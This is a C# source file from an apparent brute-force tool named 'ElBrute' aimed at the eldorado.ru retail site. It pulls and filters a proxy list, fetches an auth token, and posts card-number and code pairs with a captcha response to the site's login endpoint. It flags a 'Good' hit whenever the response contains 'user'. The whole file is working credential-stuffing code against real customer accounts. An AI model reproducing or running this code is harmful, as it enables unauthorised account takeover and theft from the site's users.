using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using xNet;

namespace ElBrute
{
    class Request
    {
        public static List<string> GetProxy()
        {
            HttpRequest danni = ReqCharacters.Req();
            string response = danni.Get("URL").ToString();

            List<string> proxyList = new List<string>();
            var proxy = JsonConvert.DeserializeObject<Dictionary<string, ResponseIP>>(response);

            for (int i = 2; i < proxy.Count; i++)
            {
                try
                {
                    string str = proxy[string.Format("{0}", i)].connectTime;
                    string[] time = str.Split('.');

                    if (Convert.ToInt32(time[0]) > 1)
                        continue;

                    proxyList.Add(proxy[string.Format("{0}", i)].ip + ":" + proxy[string.Format("{0}", i)].port);

                }
                catch { break; }
            }

            return proxyList;
        }

        public static string GetToken(ReqCharacters characters)
        {
            string token;
            try
            {
                HttpRequest danni = ReqCharacters.Req(characters.cookies, characters.proxy);
                string response = danni.Get("https://www.eldorado.ru/_ajax/spa/auth/getToken.php").ToString();

                dynamic json = JObject.Parse(response);
                token = json.token;
            }
            catch { token = ""; }

            return token;
        }

        public static string Get(ReqCharacters characters, string url)
        {
            string result;
            try
            {
                HttpRequest danni = ReqCharacters.Req(characters.cookies, characters.proxy);
                danni.ConnectTimeout = 3000;
                string response = danni.Get(url, null).ToString();
                result = response;
            }
            catch {result = "Bad";}

            return result;
        }

        public static string Post(ReqCharacters characters, PostCharacters postCharacters)
        {
            string result = "";

            try
            {
                HttpRequest danni = ReqCharacters.Req(characters.cookies, characters.proxy);

                danni.AddHeader("Accept", "application/json, text/plain, */*");
                danni.AddHeader("Accept-Language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7");
                danni.AddHeader("Referer", "https://www.eldorado.ru/");
                danni.AddHeader("Authorization", "Bearer " + postCharacters.token);

                string json = "{\"user_login\":\"" + 
                    postCharacters.card + 
                    "\",\"user_password\":\"" + 
                    postCharacters.code + 
                    "\",\"g-recaptcha-response\":\"" + 
                    postCharacters.captcha + "\"}";

                string response = danni.Post("https://www.eldorado.ru/_ajax/spa/auth/authentication.php", json, "application/json;charset=UTF-8").ToString();


                if (response.Contains("user"))
                    result = "Good";
            }
            catch { result = "Error"; }

            return result;
        }
    }
}

